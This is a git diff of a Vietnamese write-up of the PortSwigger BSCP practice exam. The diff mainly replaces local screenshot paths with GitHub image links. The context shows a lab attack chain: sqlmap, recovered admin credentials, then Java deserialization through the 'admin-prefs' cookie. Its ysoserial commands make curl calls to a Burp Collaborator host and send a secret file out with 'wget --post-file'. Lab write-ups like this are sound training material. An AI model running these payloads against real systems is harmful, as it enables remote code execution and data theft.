@@ -122,7 +122,7 @@ sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&s
 
 - Lấy được `administrator | cjbnksa6guo0y4a96o04 `, account có role admin do đó chúng ta có thể unlock được chức năng "Admin panel":
 
-![image-20211214105637238](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214105637238.png)
+![image-20211214105637238](https://user-images.githubusercontent.com/61876488/146224830-e474e8e4-a211-459c-a10c-44ec2df9de03.png)
 
 ### 3) Khai thác java deserialization tại chức năng "Admin panel":
 
@@ -130,15 +130,15 @@ sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&s
 
 - Để ý thấy khi vào chức năng này thì tại client side chúng ta được cấp cho một cookie là "admin-prefs":
 
-![image-20211214112246704](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214112246704.png)
+![image-20211214112246704](https://user-images.githubusercontent.com/61876488/146225794-949ab1da-f48f-4e6e-8a63-e46948664405.png)
 
 - Nếu thay đổi cookie này tùy ý thì:
 
-![image-20211214233523121](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214233523121.png)
+![image-20211214233523121](https://user-images.githubusercontent.com/61876488/146225553-4287adcd-3c42-4038-85b8-048ccddc96c7.png)
 
 - Decode này bằng **Decoder** của Burp Suite ta biết được quá trình encode của cookie sau khi serialize là : gzip encode -->  base64 encode --> url encode:
 
-![image-20211214123526651](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214123526651.png)
+![image-20211214123526651](https://user-images.githubusercontent.com/61876488/146225700-4171ece7-00d7-48dd-b133-50f181eb12af.png))
 
 - Trong plain text trên có đoạn `lab.display.admin.prefs.JavaPrefsCookieStrategy`. Nhiều khả năng web app này sẽ bị dính vuln **java deserialization** tại cookie  `admin-prefs` này.
 
@@ -150,7 +150,7 @@ sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&s
 java -jar ysoserial-master-8eb5cbfbf6-1.jar <payload types> '[command]' | gzip -f | base64 -w0
 ```
 
-![image-20211215154314051](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215154314051.png)
+![image-20211215154314051](https://user-images.githubusercontent.com/61876488/146225935-e7c9ecfa-cedb-4c1d-9fa9-3260917195bf.png)
 
 - Ta phát hiện có một payload type có thể dùng được là **CommonsCollections6** vì nó trả về status code 200, trong khi các payload type khác đều trả về status code 500 và **ClassNotFoundException** (các payload type khác có thể có exception khác, dùng phương pháp thử rồi loại suy thông qua exeption để tìm ra payload type phù hợp). 
 
@@ -160,7 +160,7 @@ java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 'curl https://<b
 
 ###### Kết quả:
 
-![image-20211214173728534](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214173728534.png)
+![image-20211214173728534](https://user-images.githubusercontent.com/61876488/146226035-87a069d0-3b5e-4680-9637-6f0500294d1e.png)
 
 ```bash
 java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'curl -X POST -d Hello https://<burp colab id>.burpcollaborator.net' | gzip -f | base64 -w0
@@ -168,9 +168,9 @@ java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'curl -X POST -d
 
 ###### Kết quả:
 
-![image-20211215153848790](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215153848790.png)
+![image-20211215153848790](https://user-images.githubusercontent.com/61876488/146226107-3b70e47b-2c23-4cc4-80aa-c30510c693ba.png)
 
-![image-20211215163312473](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215163312473.png)
+![image-20211215163312473](https://user-images.githubusercontent.com/61876488/146226178-34d29412-1f4a-4eb0-849c-abd37701766c.png)
 
 - Điều này có nghĩa là gadget chain tạo với payload type **CommonsCollections6** là hợp lệ và chúng ta có thể RCE thông qua gadget chain này. tạo payload như trong hình:
 
@@ -178,25 +178,22 @@ java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'curl -X POST -d
 java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'wget --post-file /home/carlos/secret c2ft9nahenbthexwc6hd0c9m4da3ys.burpcollaborator.net' | gzip -f | base64 -w0
 ```
 
-
-
-![image-20211215154458664](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215154458664.png)
+![image-20211215154458664](https://user-images.githubusercontent.com/61876488/146226291-b748f2ca-8558-4c6b-9c03-a6a7dfa096ab.png)
 
 - Lưu ý trước khi cho payload trên vào cookie `admin-prefs` thì phải URL encode nó:
 
-![image-20211215154844486](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215154844486.png)
+![image-20211215154844486](https://user-images.githubusercontent.com/61876488/146226418-fe236de8-9ac5-4541-adbc-5642f32865fd.png)
 
 - Cuối cùng thì chúng ta gửi request và poll Burp Collaborator Client và đợi kết quả:
 
-![image-20211215155200561](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215155200561.png)
+![image-20211215155200561](https://user-images.githubusercontent.com/61876488/146226480-ec4e59b6-9818-43e8-a26e-78997c167d14.png)
 
 ###### Lưu ý: Cách khai thác Java Deserialize ở trên dựa vào bài lab của PortSwigger là [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons).
 
 ##### 4) Kết quả Practice Exam BSCP:
 
-![image-20211215155436265](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215155436265.png)
+![image-20211215155436265](https://user-images.githubusercontent.com/61876488/146226623-dd2ddd99-5b72-425c-b055-2d6316414c69.png)
 
-![image-20211215155444115](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215155444115.png)
+![image-20211215155444115](https://user-images.githubusercontent.com/61876488/146226686-18428acd-1f33-4f19-9910-8a5afc716e1f.png)
 
-![image-20211215165432252](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215165432252.png)
-
+![image-20211215165432252](https://user-images.githubusercontent.com/61876488/146226741-573b1d60-6ff6-479f-8c87-db0085b8ebcc.png)
